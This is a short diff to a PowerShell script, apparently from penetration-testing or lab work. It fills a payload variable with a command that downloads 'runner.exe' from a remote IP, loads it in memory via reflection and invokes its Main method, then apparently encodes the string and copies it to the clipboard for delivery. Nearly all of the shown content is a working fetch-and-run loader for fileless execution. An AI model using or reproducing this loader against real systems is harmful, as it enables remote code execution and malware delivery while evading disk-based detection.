@@ -1,4 +1,8 @@
-$payload = "<payload>"
+$payload = "powershell -Command `"$bytes = (Invoke-WebRequest 'http://192.168.45.189/runner.exe').Content; " +
+           "$assembly = [System.Reflection.Assembly]::Load($bytes); " +
+           "$entryPointMethod = $assembly.GetTypes().Where({$_.Name -eq 'Program'}, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic'); " +
+           "$entryPointMethod.Invoke($null, (, [string[]] ('arg1', 'arg2')))`""
+
 
 [string]$output = ""
 
@@ -20,3 +24,4 @@ $payload.ToCharArray() | %{
     }
 }
 $output | clip
+
